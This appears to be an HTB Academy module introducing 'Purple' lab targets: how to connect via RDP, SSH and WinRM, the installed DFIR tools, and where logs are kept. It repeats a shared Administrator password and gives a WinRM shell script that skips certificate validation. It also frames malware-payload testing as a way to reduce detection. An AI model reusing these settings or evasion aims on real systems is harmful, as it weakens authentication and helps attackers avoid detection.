# Introduction

In this module, "Intro to Academy's Purple Modules", we will introduce you to HTB Academy's Purple modules, which bridge the gap between Offensive and Defensive modules and provide a holistic view of both the attacking and defending perspectives on the covered topics. More specifically, the Purple modules will allow for in-depth forensic analysis through detailed logging, traffic, and memory capturing, and a pre-installed DFIR toolset within each target after completing the attack part of each section.

It is crucial to note that forensic analysis requires the attack part to occur first, as this generates the logs and traffic that will be captured and analyzed. The same applies to memory dumps, which can be obtained after the attack.

Moreover, the spawned target must remain active to facilitate forensic analysis activities. Extending the target's lifetime may be necessary to ensure there is sufficient time to complete the forensic analysis.

* * *

The module is divided into two parts:

1. `Windows Purple Module Targets`
2. `Linux Purple Module Targets`

Each section of this module serves as a reference guide, empowering users to effectively access, configure, and manage critical logging and forensic mechanisms within the Purple module targets. These sections also provide step-by-step guidance on locating logs, traffic captures, memory dumps, configuration files, and utilizing pre-installed DFIR tools to facilitate comprehensive post-exploitation forensic analysis.

* * *

## Benefits of Academy's Purple Modules

Purple modules are highly beneficial for both Blue Team and Red Team members. For Blue Team professionals, these modules offer exposure to Red Team tactics and enable them to learn how to emulate these techniques. Meanwhile, Red Team operators gain invaluable insights into the artifacts their attacks leave behind, allowing them to refine their methods and minimize detectable footprints with each iteration.

**`Disclaimer:`** Please note that the "Intro to Academy's Purple Modules" module is designed for individuals with a good understanding of both offensive and defensive security practices. This module assumes that participants are proficient in operating Windows and Linux systems and are familiar with common attack vectors and detection methodologies. As such, the DFIR toolset included, as well as the attacking and detecting techniques discussed, will not be covered in exhaustive detail. This module is intended for experienced professionals in the field, aiming to showcase how upcoming Purple modules should be approached and to highlight the capabilities of Purple module targets.

#### Purple Module Targets as Reusable Infrastructure

- **`Blue Team Use Cases of Purple Module Targets:`**  - Blue team professionals can transfer evidence from other compromised machines into Purple module targets for in-depth analysis, leveraging the built-in DFIR tools.
  - Blue team professionals can install vulnerable software of their choosing, simulate attacks on the software, and analyze the attack artifacts left behind, gaining practical insight into threat behaviors and identifying IOCs.
  - Blue team professionals can use the verbose logs and DFIR toolset of Purple module targets to develop and refine detection rules for identified IOCs.
  - Blue team professionals can use these targets to develop and validate threat hunting hypotheses by emulating attack chains and investigating the associated logs and system changes.
  - Blue team professionals can collect telemetry to reverse-engineer malware behavior in a controlled environment and design incident response playbooks.
- **`Red Team Use Cases of Purple Module Targets:`**  - Red team professionals can test custom-built or modified malware payloads to observe logs, process behavior, and other telemetry data. They can then use this data to refine methods and reduce detection opportunities.
- **`Purple Team Use Cases of Purple Module Targets:`**  - Both Blue and Red Teams can collaborate to simulate full attack-and-detect cycles, using the Purple module targets as the shared and controlled platform for learning and innovation.


# Connecting to Windows Purple Module Targets

## Connection Methods

In this section, we will demonstrate the various methods available for connecting to Windows Purple module targets `after` the attack part of each section has concluded. The following connection methods can be used for remote management and interaction:

- Remote Desktop Protocol (RDP)
- Secure Shell (SSH)
- Windows Remote Management (WinRM)

## Remote Desktop Protocol (RDP)

RDP is a widely used protocol for remotely connecting to a Windows environment. It provides full access to the machine's graphical user interface (GUI), making it ideal for users who need direct interaction with the desktop.

#### **Steps to Connect via RDP from Windows:**

- Download the `VPN connection file` by following the appropriate guide: use [this article](https://help.hackthebox.com/en/articles/9297532-connecting-to-academy-vpn) if logged into HTB Academy, or [this article](https://help.hackthebox.com/en/articles/5599332-enterprise-lab-access) if logged into HTB Enterprise. Then, use VPN software such as [OpenVPN](https://openvpn.net/) to connect to the VPN server and to reach the target.
- Retrieve the IP address of the Windows Purple module target, displayed at the bottom of the respective section once the target has been spawned.
- Open an RDP client (e.g., Remote Desktop Connection on Windows) and enter the IP address.
- Authenticate using the following credentials to initiate the session:
  - Username: `Administrator`
  - Password: `P3n#31337@LOG`

You can also launch an RDP client by typing `mstsc.exe` into the Run dialog (Windows key + R) or a command prompt.

![Remote Desktop Connection window with fields for computer name and username, and buttons for Connect and Help.](https://academy.hackthebox.com/storage/modules/257/logging_18.png)

#### **Steps to Connect via RDP From Linux (including Pwnbox):**

- If you are not using Pwnbox, download the `VPN connection file` by following the appropriate guide: use [this article](https://help.hackthebox.com/en/articles/9297532-connecting-to-academy-vpn) if logged into HTB Academy, or [this article](https://help.hackthebox.com/en/articles/5599332-enterprise-lab-access) if logged into HTB Enterprise. Then, use VPN software such as [OpenVPN](https://openvpn.net/) to [connect to the VPN](https://help.hackthebox.com/en/articles/9297532-connecting-to-academy-vpn). If you are using Pwnbox, you are already connected to the VPN.
- Retrieve the IP address of the Windows Purple module target, displayed at the bottom of the respective section once the target has been spawned.
- Execute the command below, specifying the following credentials.
  - Username: `Administrator`
  - Password: `P3n#31337@LOG`

```shell
xfreerdp /u:<username> /p:<password> /v:<Target_IP> /dynamic-resolution
[08:17:44:253] [369695:369696] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-60784/.config/freerdp
[08:17:44:253] [369695:369696] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-60784/.config/freerdp/certs]
[08:17:44:253] [369695:369696] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-60784/.config/freerdp/server]
[08:17:44:420] [369695:369696] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[08:17:44:420] [369695:369696] [WARN][com.freerdp.crypto] - CN = Logging-VM
[08:17:44:420] [369695:369696] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[08:17:44:420] [369695:369696] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[08:17:44:420] [369695:369696] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[08:17:44:420] [369695:369696] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.232.10:3389)
[08:17:44:420] [369695:369696] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[08:17:44:420] [369695:369696] [ERROR][com.freerdp.crypto] - Common Name (CN):
[08:17:44:420] [369695:369696] [ERROR][com.freerdp.crypto] - 	Logging-VM
[08:17:44:420] [369695:369696] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.232.10:3389 (RDP-Server):
	Common Name: Logging-VM
	Subject:     CN = Logging-VM
	Issuer:      CN = Logging-VM
	Thumbprint:  a8:35:0a:61:04:6b:48:d4:6d:a8:cb:8c:d6:ca:28:86:f2:22:12:55:8a:29:75:a1:ba:c2:77:82:9d:cc:1e:87
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
[08:18:01:881] [369695:369696] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[08:18:02:582] [369695:369696] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[08:18:02:582] [369695:369696] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[08:18:02:591] [369695:369696] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[08:18:02:591] [369695:369696] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[08:18:02:591] [369695:369696] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
[08:18:04:733] [369695:369696] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]

```

You should now be able to access the Windows Purple module target via RDP.

![Windows desktop with icons for Recycle Bin, Firefox, IDA Freeware, Wireshark, and root.txt file.](https://academy.hackthebox.com/storage/modules/257/logging_17.png)

Another alternative Linux RDP client is [remmina](https://remmina.org/).

#### **Steps to Connect via RDP from macOS:**

You can use the [Microsoft Remote Desktop](https://apps.apple.com/us/app/windows-app/id1295203466) app from the Mac App Store.

- Download the `VPN connection file` by following the appropriate guide: use [this article](https://help.hackthebox.com/en/articles/9297532-connecting-to-academy-vpn) if logged into HTB Academy or [this article](https://help.hackthebox.com/en/articles/5599332-enterprise-lab-access) if logged into HTB Enterprise. Then, use VPN software such as [OpenVPN](https://openvpn.net/) to connect to the VPN and to reach the target.
- Install `Microsoft Remote Desktop` from the macOS App Store.
- Open the app and add a new PC.
- Retrieve the IP address of the Windows Purple module target, displayed at the bottom of the respective section once the target has been spawned.
- Enter the IP address
- Start the session and specify the following credentials when prompted to connect to the Windows Purple module target via RDP.
  - Username: `Administrator`
  - Password: `P3n#31337@LOG`

![Add PC window with fields for PC name, credentials, and options for reconnecting.](https://academy.hackthebox.com/storage/modules/257/logging_21.png)

**Note**: RDP connections use port `3389` by default, and traffic through this port is logged in firewall logs.

* * *

## Secure Shell (SSH)

SSH provides secure, command-line-based access to the Windows machine, making it ideal for remote administration without the need for a graphical interface. Both Windows, Linux, and macOS come with an SSH client pre-installed, so no additional software is required.

#### **Steps to Connect via SSH from Windows, macOS, and Linux (including Pwnbox):**

- If you are not using Pwnbox, download the `VPN connection file` by following the appropriate guide: use [this article](https://help.hackthebox.com/en/articles/9297532-connecting-to-academy-vpn) if logged into HTB Academy, or [this article](https://help.hackthebox.com/en/articles/5599332-enterprise-lab-access) if logged into HTB Enterprise. Then, use VPN software such as [OpenVPN](https://openvpn.net/) to [connect to the VPN](https://help.hackthebox.com/en/articles/9297532-connecting-to-academy-vpn). If you are using Pwnbox, you are already connected to the VPN.
- After obtaining the IP address of the Windows Purple module target, displayed at the bottom of the respective section, use the command below to connect via SSH, specifying the following credentials:
  - Username: `Administrator`
  - Password: `P3n#31337@LOG`

```shell
ssh username@<Target_IP> -v

Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

username@<Target_IP>'s password:

Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

administrator@LOGGING-VM C:\Users\Administrator>

```

**Note**: This method provides command-line access only to the Windows Purple module target.

## Windows Remote Management (WinRM)

WinRM is a PowerShell-based remote management service that allows users to execute commands or scripts on a Windows machine from a remote computer.

#### **Steps to Connect via WinRM from Windows:**

- Download the `VPN connection file` by following the appropriate guide: use [this article](https://help.hackthebox.com/en/articles/9297532-connecting-to-academy-vpn) if logged into HTB Academy, or [this article](https://help.hackthebox.com/en/articles/5599332-enterprise-lab-access) if logged into HTB Enterprise. Then, use VPN software such as [OpenVPN](https://openvpn.net) to connect to the VPN and to reach the target.
- You can connect to a Windows Purple module via WinRM from another Windows machine using PowerShell, as follows, specifying the credentials below:
  - Username: `Administrator`
  - Password: `P3n#31337@LOG`

```powershell
PS C:\> $s0 = New-PSSessionOption -SkipCACheck -SkipCNCheck
PS C:\> Enter-PSSession -ComputerName 'Target_IP' -Credential Administrator -UseSSL -SessionOption $s0
[Target_IP]: PS C:\Users\Administrator\Documents>

```

#### **Steps to Connect via WinRM from Linux (including Pwnbox) or macOS:**

If you are not using Pwnbox, download the `VPN connection file` by following the appropriate guide: use [this article](https://help.hackthebox.com/en/articles/9297532-connecting-to-academy-vpn) if logged into HTB Academy, or [this article](https://help.hackthebox.com/en/articles/5599332-enterprise-lab-access) if logged into HTB Enterprise. Then, use VPN software such as [OpenVPN](https://openvpn.net) to [connect to the VPN](https://help.hackthebox.com/en/articles/9297532-connecting-to-academy-vpn). If you are using Pwnbox, you are already connected to the VPN.

A viable solution to connect via WinRM from Linux is installing Python's `pywinrm` package.

```shell
pip install pywinrm
Defaulting to user installation because normal site-packages is not writeable
Collecting pywinrm
  Downloading pywinrm-0.5.0-py3-none-any.whl.metadata (11 kB)
Requirement already satisfied: requests>=2.9.1 in /usr/local/lib/python3.11/dist-packages (from pywinrm) (2.32.3)
Requirement already satisfied: requests-ntlm>=1.1.0 in /usr/local/lib/python3.11/dist-packages (from pywinrm) (1.3.0)
Requirement already satisfied: xmltodict in /usr/local/lib/python3.11/dist-packages (from pywinrm) (0.13.0)
Requirement already satisfied: charset-normalizer<4,>=2 in /usr/lib/python3/dist-packages (from requests>=2.9.1->pywinrm) (3.0.1)
Requirement already satisfied: idna<4,>=2.5 in /usr/lib/python3/dist-packages (from requests>=2.9.1->pywinrm) (3.3)
Requirement already satisfied: urllib3<3,>=1.21.1 in /usr/lib/python3/dist-packages (from requests>=2.9.1->pywinrm) (1.26.12)
Requirement already satisfied: certifi>=2017.4.17 in /usr/lib/python3/dist-packages (from requests>=2.9.1->pywinrm) (2022.9.24)
Requirement already satisfied: cryptography>=1.3 in /usr/local/lib/python3.11/dist-packages (from requests-ntlm>=1.1.0->pywinrm) (42.0.8)
Requirement already satisfied: pyspnego>=0.4.0 in /usr/local/lib/python3.11/dist-packages (from requests-ntlm>=1.1.0->pywinrm) (0.11.1)
Requirement already satisfied: cffi>=1.12 in /usr/local/lib/python3.11/dist-packages (from cryptography>=1.3->requests-ntlm>=1.1.0->pywinrm) (1.17.1)
Requirement already satisfied: pycparser in /usr/local/lib/python3.11/dist-packages (from cffi>=1.12->cryptography>=1.3->requests-ntlm>=1.1.0->pywinrm) (2.22)
Downloading pywinrm-0.5.0-py3-none-any.whl (48 kB)
Installing collected packages: pywinrm
Successfully installed pywinrm-0.5.0

[notice] A new release of pip is available: 24.2 -> 24.3.1
[notice] To update, run: /usr/bin/python -m pip install --upgrade pip

```

Below is an example of running a command using Python's [pywinrm](https://pypi.org/project/pywinrm/). Use the following credentials:

- Username: `Administrator`
- Password: `P3n#31337@LOG`

```shell
python
Python 3.11.2 (main, May  2 2024, 11:59:08) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import winrm
>>> session = winrm.Session('https://<Target_IP>:5986/wsman', auth=('Administrator','P3n#31337@LOG'), transport='ntlm', server_cert_validation='ignore')
>>> result = session.run_cmd('ipconfig')
>>> print(result.std_out.decode())

Windows IP Configuration

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::8d
   IPv6 Address. . . . . . . . . . . : dead:beef::d0a4:feb2:5340:c4f5
   Link-local IPv6 Address . . . . . : fe80::d0a4:feb2:5340:c4f5%5
   IPv4 Address. . . . . . . . . . . : Target_IP
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb0:bfbf%5
                                       10.129.0.1

>>>

```

**Note**: WinRM defaults to HTTP on port `5985`, but HTTPS on port `5986` is also available for secure connections using certificates.

The Python script below can be used to establish an interactive WinRM shell. Use the following credentials:

- Username: `Administrator`
- Password: `P3n#31337@LOG`

```python

#!/usr/bin/env python3

import winrm
import getpass

# Get connection details from user
ip_addr = input("Enter target IP address: ")
username = input("Enter username: ")
password = getpass.getpass("Enter password: ")

# Create a session for WinRM with SSL
session = winrm.Session(
    f'https://{ip_addr}:5986/wsman',  # Dynamic hostname or IP address
    auth=(username, password),
    transport='ntlm',  # Using NTLM authentication
    server_cert_validation='ignore'  # Skip certificate validation
)

def interactive_shell():
    print("WinRM Interactive Shell")
    print("Type 'exit' to quit the shell.")

    while True:
        command = input("winrm> ")

        if command.lower() == 'exit':
            print("Exiting the shell.")
            break

        # Run the command remotely
        result = session.run_cmd(command)

        # Print the result
        if result.std_out:
            print(result.std_out.decode())
        if result.std_err:
            print("Error: ", result.std_err.decode())

# Run the interactive shell
interactive_shell()

```

Here's an example of using this script (saved as `winrm_connect.py`) to connect to a Windows Purple module target from a Linux or macOS system via WinRM.

```shell
python winrm_connect.py
Enter target IP address: <Target_IP>
Enter username: Administrator
Enter password:
WinRM Interactive Shell
Type 'exit' to quit the shell.
winrm> dir
 Volume in drive C has no label.
 Volume Serial Number is B8B3-0D72

 Directory of C:\Users\Administrator

06/27/2024  02:39 AM    <DIR>          .
06/27/2024  02:39 AM    <DIR>          ..
06/19/2024  01:27 PM    <DIR>          .osquery
06/27/2024  02:39 AM    <DIR>          .ssh
06/12/2024  01:54 AM    <DIR>          3D Objects
06/12/2024  01:54 AM    <DIR>          Contacts
09/19/2024  01:02 AM    <DIR>          Desktop
11/28/2024  08:25 AM    <DIR>          Documents
09/19/2024  12:15 AM    <DIR>          Downloads
06/12/2024  01:54 AM    <DIR>          Favorites
06/12/2024  01:54 AM    <DIR>          Links
06/12/2024  02:33 AM       260,371,434 Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle
06/12/2024  02:33 AM         5,121,145 Microsoft.UI.Xaml.2.8.x64.appx
06/12/2024  02:33 AM         6,764,349 Microsoft.VCLibs.x64.14.00.Desktop.appx
06/12/2024  01:54 AM    <DIR>          Music
06/12/2024  01:54 AM    <DIR>          Pictures
06/12/2024  01:54 AM    <DIR>          Saved Games
06/12/2024  01:54 AM    <DIR>          Searches
06/12/2024  01:54 AM    <DIR>          Videos
               3 File(s)    272,256,928 bytes
              16 Dir(s)   7,156,068,352 bytes free

winrm>

```


# Available Windows DFIR Toolset

## Introduction

This section provides an overview of the installed DFIR toolset within the Windows Purple module targets, detailing the available tools/solutions and their respective locations.

## DFIR Toolset Installed

Below is a list of the DFIR toolset installed on the Windows Purple module targets for `post-exploitation` forensic analysis purposes, along with their respective installation paths.

### System Monitoring (Event Logging)

| **Name** | **Path** | **Description** |
| --- | --- | --- |
| **Sysmon** | `C:\Windows\Sysmon64.exe` | Provides detailed event logging and detection. |

### Log Analysis

| **Name** | **Path** | **Description** |
| --- | --- | --- |
| **Eric Zimmerman Tools** | `C:\Tools\EZ-Tools` | Forensic utilities for analyzing digital evidence, such as registry hives and event logs. |

### Threat Detection & Monitoring

| **Name** | **Path** | **Description** |
| --- | --- | --- |
| **Yara** | `C:\Tools\yara\yara.exe` | Signature-based file scanning tool. |
| **Chainsaw** | `C:\Tools\Sigma\chainsaw\chainsaw_x86_64-pc-windows-msvc.exe` | Command-line tool for parsing and hunting through Windows Event Logs. |
| **Sigma** | `C:\Program Files\Python312\Scripts\sigma.exe` | Generic signature format for SIEM rule creation. |
| **Zircolite** | `C:\Tools\Sigma\zircolite\zircolite_win_x64_2.20.0.exe` | Sigma-based EVTX log analysis. |
| **Osquery** | `C:\Program Files\osquery\osqueryi.exe` | Endpoint monitoring using SQL-like queries. |
| **Velociraptor** | `C:\Program Files\Velociraptor` ( `https://<Target_IP>:8889`) | Endpoint monitoring, collection, and response. |

**Notes**:

- Specify the following credentials to log into `Velociraptor`:

  - Username: `admin`
  - Password: `P3n#31337@LOG`
- `Allow Windows Purple module targets to run for at least 5 minutes after spawning` to ensure that all services have fully initialized (including Velociraptor).

### Traffic Capturing

| **Name** | **Path** | **Description** |
| --- | --- | --- |
| **Wireshark** | `C:\Program Files\Wireshark` | Packet capture tool for network traffic analysis. |

### Memory Dumping

| **Name** | **Path** | **Description** |
| --- | --- | --- |
| **DumpIt** | `C:\Tools\Memory-Dump\DumpIt.exe` | Memory dumping utility for memory forensics. |
| **WinPmem** | `C:\Tools\Memory-Dump\winpmem_mini_x64_rc2.exe` | Memory dumping utility for memory forensics. |

### Memory Forensics

| **Name** | **Path** | **Description** |
| --- | --- | --- |
| **Volatility v2** | `C:\Tools\Volatility2` | Memory forensics tool for analyzing memory dumps. |
| **Volatility v3** | `C:\Tools\volatility3` | Memory forensics tool for analyzing memory dumps. |

### Additional Telemetry

| **Name** | **Path** | **Description** |
| --- | --- | --- |
| **SilkETW** | `C:\Tools\SilkETW\SilkETW\SilkETW.exe` | C# wrappers for ETW. |
| **SealighterTI** | `C:\Tools\SealighterTI.exe` | Running Microsoft-Windows-Threat-Intelligence without a driver. |
| **AMSI-Monitoring-Script** | `C:\Tools\AMSIScript\AMSIScriptContentRetrieval.ps1` | Extracting script contents using the AMSI ETW provider. |
| **JonMon** | `C:\Tools\JonMon` | Collection of open-source telemetry sensors. |
| **Fibratus** (Added after this module's release; not available in its targets) | `C:\Program Files\Fibratus` | Adversary tradecraft detection using behavior-driven rule engine and YARA memory scanner. Event logs can be viewed in Application logs in Event Viewer |
| **Atomic Red Team** (Added after this module's release; not available in its targets) | `C:\AtomicRedTeam` | Small and highly portable detection tests based on MITRE's ATT&CK. |

### Malware/Process/PE Analysis

| **Tool** | **Path** | **Description** |
| --- | --- | --- |
| **CFF-Explorer** | `C:\Tools\CFF-Explorer\CFF Explorer.exe` | Tool designed for examining and editing Portable Executable (PE) files. |
| **Ghidra** | `C:\Tools\Ghidra\ghidraRun.bat` | Software reverse engineering (SRE) framework. |
| **x64dbg** | `C:\Tools\x64dbg` | Open-source x64/x32 debugger for windows. |
| **SpeakEasy** | `C:\Tools\speakeasy` | Modular, binary emulator designed to emulate Windows kernel and user mode malware. |
| **SysInternalsSuite** | `C:\Tools\SysinternalsSuite` | Sysinternals Troubleshooting Utilities. |
| **Get-InjectedThread** | `C:\Tools\Get-InjectedThread.ps1` | Looks for threads that were created as a result of code injection. |
| **Hollows\_Hunter** | `C:\Tools\hollows_hunter64.exe` | Scans all running processes. Recognizes and dumps a variety of potentially malicious implants. |
| **Moneta** | `C:\Tools\Moneta64.exe` | Live usermode memory analysis tool for Windows with the capability to detect malware IOCs. |
| **PE-Sieve** | `C:\Tools\pe-sieve64.exe` | Detects malware running on the system, as well as collects the potentially malicious material for further analysis. |
| **API-Monitor** | `C:\Tools\API Monitor` | Monitors and controls API calls made by applications and services. |
| **PE-Bear** | `C:\Tools\PE-bear` | Multiplatform reversing tool for PE files. |
| **ProcessHacker** | `C:\Tools\ProcessHacker` | Monitors system resources, debugs software and detects malware. |
| **ProcMonX** | `C:\Tools\ProcMonX.exe` | Extended Process Monitor-like tool based on Event Tracing for Windows. |
| **Frida** (Added after this module's release; not available in its targets) | `C:\Program Files\Python312\Scripts\frida.exe` | Dynamic instrumentation toolkit for reverse-engineers. Helps to trace, instrument, debug and hook API functions |
| **LitterBox** (Added after this module's release; not available in its targets) | `C:\Tools\LitterBox\litterbox.py` | Malware sandbox environment for payload behavior testing. |


# Windows Logs & Traffic Captured

In this section, we will explore the logs and traffic captures available on Windows Purple module targets, as well as how to access and manage them. Logging and traffic monitoring are essential for identifying suspicious activity. The logging and forensic mechanisms configured on Windows Purple module targets are designed to generate detailed, highly verbose logs, supporting both real-time monitoring and historical analysis.

* * *

## Event Logging

Windows Purple module targets are equipped with verbose logging mechanisms to ensure comprehensive tracking and monitoring of system activities, including command execution, network connections, PowerShell usage, and security events. In this section, we will explore the various locations where these events can be reviewed and accessed.

#### Sysmon Logs

[Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon) (System Monitor) is a powerful system activity monitoring tool within the Microsoft Sysinternals suite. Sysmon works by installing a system `driver` and a Windows `service`, allowing it to capture detailed events that can be logged into the Windows Event Log for centralized analysis.

Sysmon logs provide detailed and granular information about system activities, including process creations with full command-line details, network connections with associated processes, changes to file creation times, and the loading of drivers or DLLs. Additionally, Sysmon can capture hashes of process image files, detect raw disk access, and log events from the early stages of the boot process, offering robust capabilities for tracking and analyzing potentially malicious behavior.

Sysmon logs can be viewed in the `Event Viewer` by navigating to `Applications and Services Logs` \> `Microsoft` \> `Windows` \> `Sysmon`. This folder contains detailed logs generated by Sysmon for analysis and monitoring.

![Event Viewer showing Sysmon logs with 50,931 events.](https://academy.hackthebox.com/storage/modules/257/sysmon1.png)

![Event Viewer displaying Sysmon logs with 51,106 events.](https://academy.hackthebox.com/storage/modules/257/sysmon2.png)

Sysmon logs are stored as part of the Windows Event Log system. The logs are located on disk at the following default path:

`C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx`

**Note**: The Sysmon configuration file in use is located at `C:\Windows\System32\sysmonconfig-excludes-only.xml` (taken from [here](https://raw.githubusercontent.com/olafhartong/sysmon-modular/master/sysmonconfig-excludes-only.xml)). We can specify and apply our own Sysmon configuration file by using Sysmon's binary `before` initiating the attack part of each section as follows.

```cmd-session
C:\Windows> sysmon64.exe -c path\filename.xml

```

#### Command Line Logging

Command Line Logging captures information about processes and their command-line arguments, which is useful for detecting suspicious activity, such as unauthorized execution of commands. The relevant Windows event ID is `4688` (A new process has been created).

Event ID `4688` is logged whenever a process is created on the system, and it includes the following details:

- Process Name
- Process ID (PID)
- Command Line Arguments
- User Account
- Creation Time

This log is invaluable for tracking process execution, especially in threat-hunting scenarios where attackers often execute commands or scripts. These events can be viewed in the `Event Viewer` under `Security`. It should be noted that both `Sysmon` and `JonMon` (covered later) also provide visibility into process creation.

![Event Viewer displaying security logs with details of a process creation event.](https://academy.hackthebox.com/storage/modules/257/comlog1.png)

Event ID 4688 logs are stored in the `Security` logs of the Windows Event Log system. These logs are located on disk at the following default path:

`C:\Windows\System32\winevt\Logs\Security.evtx`

#### PowerShell Logging

PowerShell logging (Module and Script Block Logging) is an important security feature as attackers often leverage PowerShell to execute malicious code. Script block logging captures the full content of scripts that are executed, including obfuscated or dynamically generated code. This is crucial for detecting sophisticated attacks. The Event ID for Script Block Logging is `4104`.

PowerShell logs can be viewed in the `Event Viewer` by navigating to `Applications and Services Logs` \> `Microsoft` \> `Windows` \> `PowerShell`.

![Event Viewer displaying PowerShell logs with Event ID 4104 for remote command execution.](https://academy.hackthebox.com/storage/modules/257/logging_14.png)

PowerShell logs are stored as part of the Windows Event Log system. The logs are located on disk at the following default path:

`C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx`

##### Console History

PowerShell logs the command history of interactive console sessions, making it a valuable resource for tracking user activity and identifying potentially malicious behavior. This console history is stored in the user's profile directory at the following location:

`C:\Users\%username%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

#### Audit Policies

Verbose auditing provides comprehensive tracking of both success and failure events across the system. Enabling all success and failure auditing using the `auditpol` command can provide a wealth of detailed event logs, offering deeper visibility into system activities.

Enabling all audit policies indiscriminately can lead to significant storage overhead due to the sheer volume of logs generated. This not only consumes system resources but can also complicate forensic investigations. A large volume of logs can make it difficult to sift through the noise and identify relevant events, potentially delaying incident response and analysis.

In real-world environments, it is essential to carefully fine-tune audit policies to strike the right balance between visibility and usefulness. By tailoring the policies to focus on high-priority activities — such as privileged account usage, access to sensitive files, and network connections — you can optimize storage usage and ensure the logs generated are actionable and relevant for security monitoring and forensics.

Audit policy logs provide detailed insights into system access, privilege usage, and security settings modifications. Audit policy logs are saved as part of the `Security` logs in the Windows Event Log system. These logs are stored on disk at the following default path:

`C:\Windows\System32\winevt\Logs\Security.evtx`

The Microsoft documentation [Audit Policy Recommendations](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/audit-policy-recommendations) provides detailed guidance on configuring audit policies for Windows environments. The article is part of the Security Best Practices series for Active Directory and focuses on fine-tuning audit settings to enhance system security while minimizing unnecessary overhead.

**Note**: The enabled audit policies can be identified by executing the following command. Users can also define and apply their own (even custom) audit policies `before` initiating the attack part in each section.

```cmd-session
C:\Users\Administrator>auditpol /get /category:*

System audit policy
Category/Subcategory                      Setting
System
  Security System Extension               Success
  System Integrity                        Success and Failure
  IPsec Driver                            Success
  Other System Events                     Success and Failure
  Security State Change                   Success
Logon/Logoff
  Logon                                   Success and Failure
  Logoff                                  Success
  Account Lockout                         Success
  IPsec Main Mode                         Success
  IPsec Quick Mode                        Success
  IPsec Extended Mode                     Success
  Special Logon                           Success
  Other Logon/Logoff Events               Success
  Network Policy Server                   Success and Failure
  User / Device Claims                    Success
  Group Membership                        Success
Object Access
  File System                             Success
  Registry                                Success
  Kernel Object                           Success
  SAM                                     Success
  Certification Services                  Success
  Application Generated                   Success
  Handle Manipulation                     Success
  File Share                              Success
  Filtering Platform Packet Drop          Success
  Filtering Platform Connection           Success
  Other Object Access Events              Success
  Detailed File Share                     Success
  Removable Storage                       Success
  Central Policy Staging                  Success
Privilege Use
  Non Sensitive Privilege Use             Success
  Other Privilege Use Events              Success
  Sensitive Privilege Use                 Success
Detailed Tracking
  Process Creation                        Success
  Process Termination                     Success
  DPAPI Activity                          Success
  RPC Events                              Success
  Plug and Play Events                    Success
  Token Right Adjusted Events             Success
Policy Change
  Audit Policy Change                     Success
  Authentication Policy Change            Success
  Authorization Policy Change             Success
  MPSSVC Rule-Level Policy Change         Success
  Filtering Platform Policy Change        Success
  Other Policy Change Events              Success
Account Management
  Computer Account Management             Success
  Security Group Management               Success
  Distribution Group Management           Success
  Application Group Management            Success
  Other Account Management Events         Success
  User Account Management                 Success
DS Access
  Directory Service Access                Success
  Directory Service Changes               Success
  Directory Service Replication           Success
  Detailed Directory Service Replication  Success
Account Logon
  Kerberos Service Ticket Operations      Success
  Other Account Logon Events              Success
  Kerberos Authentication Service         Success
  Credential Validation                   Success

```

#### Windows Firewall Logs

Windows Firewall logs provide detailed information about inbound and outbound network connections, including allowed and blocked connections.

Windows Firewall logs provide valuable insights into the following:

- Source and destination IP addresses
- Source and destination ports
- Connection status (allowed/blocked)
- Protocol used (TCP/UDP)

By default, these logs are stored in the following location:

`C:\Windows\System32\LogFiles\Firewall\pfirewall.log`

The Windows Firewall logs information to the `pfirewall.log` file when it processes network traffic. The firewall log records all traffic that is either allowed or blocked. The screenshot below shows what this file looks like:

![Notepad displaying Windows Firewall log entries with allow and receive actions.](https://academy.hackthebox.com/storage/modules/257/logging_9.png)

**Note**: There is another event (Event ID 5156) that is logged by the `Windows Filtering Platform` (WFP), which is responsible for processing network packets. Event ID `5156` is logged whenever a network connection is allowed by the Windows Filtering Platform. If the computer or device shouldn't have access to the Internet, or contains only applications that don’t connect to the Internet, monitor for [5156](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-5156) events where the "Destination Address" falls outside private IP address ranges, indicating potential communication with the public Internet.

